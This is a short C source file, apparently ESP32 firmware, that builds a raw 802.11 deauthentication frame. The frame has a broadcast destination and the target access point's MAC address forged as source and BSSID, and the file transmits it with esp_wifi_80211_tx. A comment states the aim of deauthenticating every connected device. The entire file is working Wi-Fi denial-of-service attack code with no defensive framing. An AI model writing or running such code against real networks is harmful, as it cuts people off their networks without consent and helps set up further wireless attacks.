#include "deauthentication.h"

uint8_t deauthenticationRaw[] = {
  0xC0, 0x00,  // 0-1: Frame Control : subtype C0 -> deauthentication
  0x00, 0x00,  // 2-3: Duration
  0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF,  // 4-9: Destination address (broadcast). Deauth every device connected.
  0x00, 0x00, 0x00, 0x00, 0x00, 0x00,  // 10-15: Source address : AP's mac
  0x00, 0x00, 0x00, 0x00, 0x00, 0x00,  // 16-21: BSSID : AP's mac
  0x00, 0x00,  // 22-23: Sequence / fragment number
  0x01, 0x00,  // 24-25: Reason : 1 = unspecified
};

void deauthenticateTarget(wifi_AP* targetAP) {

  // Copies the target mac address to deauth frame
  memcpy(&deauthenticationRaw[10], targetAP->macAddr.mac, 6);
  memcpy(&deauthenticationRaw[16], targetAP->macAddr.mac, 6);

  // Sends deauth frame
  esp_wifi_80211_tx(WIFI_IF_AP, deauthenticationRaw, sizeof(deauthenticationRaw), false);
}